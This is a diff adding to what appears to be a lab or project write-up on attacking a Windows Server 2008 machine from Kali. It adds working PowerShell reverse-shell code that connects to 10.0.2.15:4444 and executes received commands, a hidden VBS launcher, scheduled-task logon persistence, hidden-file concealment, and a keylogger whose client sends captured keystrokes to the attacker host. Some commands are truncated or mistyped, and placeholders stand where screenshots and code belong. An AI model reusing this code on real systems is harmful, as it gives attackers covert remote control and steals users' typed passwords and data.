@@ -122,8 +122,58 @@ Invoke-WebRequest -Uri "http://10.0.2.15/Persistance.vbs" -OutFile "C:\Persistan
 
 - **Setting the Scripts to Run at Logon**: The seguent command is executed `schtasks /create /tn "Persistance" /tr "wscript.exe 'C:\Persistance.vbs'" /sc onlogon /ru "BUILTIN\Administrators" /rp ""` to set the scripts to run at every log on as administrator by creating a task named "Persistance". This ensures that the attacker retains access to the machine, even if it is rebooted.
 
-(Note: Insert screenshot of the scripts here)
+# IMMAGINE RS KALI CON COMANDI ESEGUITI E LS PER VEDERE I FILE SCARICATI
 
-(Note: Insert code snippet of the "Persistence.ps1" and "persistence.vbs" scripts here)
+Here the code inside the file "Persistance.ps1"
+```powershell
+Start-Job -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.0.2.15',4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+	$sendback = (iex $data 2>&1 | Out-String )
+	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+	$stream.Write($sendbyte,0,$sendbyte.Length)
+	$stream.Flush()
+	}
+$client.Close()
+} 
+Pause
+```
 
-This demonstration serves as a reminder of the potential dangers of running untrusted scripts and the importance of maintaining robust security measures to protect against such threats.
+And the code of the file "Persistance.vbs"
+```powershell
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -File ""C:\Persistance.ps1""", 0, False
+```
+
+Finally, to further conceal the presence of these scripts on the victim's machine, they can be marked as hidden files. This can be achieved using the `attrib` command in Windows, which allows file attributes to be viewed or changed. The specific command used is `attrib +h Persistence.ps1; attrib +h Persistence.vbs`. This command sets the 'hidden' attribute for both "Persistence.ps1" and "Persistence.vbs", making them invisible in a standard directory listing. This means that a casual inspection of the directory would not reveal the presence of these files, making it even harder for the victim to detect the intrusion.
+
+## Keylogger
+
+In this project, a keylogger was implemented using a C program, which was converted manually from an original C++ program found on the internet at this link: [Key-Logger ++](https://github.com/chi-wei-lien/key-logger/blob/main/keylogger.cpp). The conversion was necessary due to some missing libraries in Windows Server 2008, in modern operating systems the C++ runs correctly.
+
+The keylogger records all the keystrokes and saves them in a file named "log.txt". 
+
+In addition to the keylogger, two more C programs were written:
+
+1. **Client Program**: This program runs at every startup of the victim's machine. It reads the content of the "log.txt" file and sends it over a TCP connection to the attacker's machine (a Kali Linux system).
+
+2. **Server Program**: This program runs on the attacker's machine, listening on port 8080. It waits to receive the content of the "log.txt" file sent by the client program and stores it in a file named "output.txt".
+
+The keylogger and the client program are run in the background, making them less likely to be noticed by the victim. This stealthy operation helps to keep the attack unnoticed.
+
+To further facilitate this process, two additional files, "key_logger.ps1" and "key_logger.vbs", were created. These files are set to run at every logon. They download the ".exe" files of the keylogger and the client program and execute them. A task was created for these files to ensure they run at every logon, these operations were done using the same commands used for the persistance. To make them less noticeable, the 'hidden' attribute was set for these files as has been done previously.
+```powershell
+-Uri "http://10.0.2.15/Key_Logger_Dw.ps1" -OutFile "C:\Key_Logger_Dw.ps1"
+-Uri "http://10.0.2.15/Key_Logger_Dw.vbs" -OutFile "C:\Key_Logger_Dw.vbs"
+schtasks /create /tn "Key_Logger" /tr "wscript.exe 'C:\Key_Logger_Dw.vbs'" /sc onlogon /ru "BUILTIN\Administrators" /rp ""
+.\Kew_Logger.vbs
+attrib +h Key_Logger_Dw.ps1; attrib +h Key_Logger_Dw.vbs; attrib +h Key_Logger.exe; attrib +h Client_Key_Logger.exe
+```
+
+
+(Note: Insert screenshot of the keylogger, client, and server programs here)
+
+(Note: Insert code snippet of the keylogger, client, and server programs here)
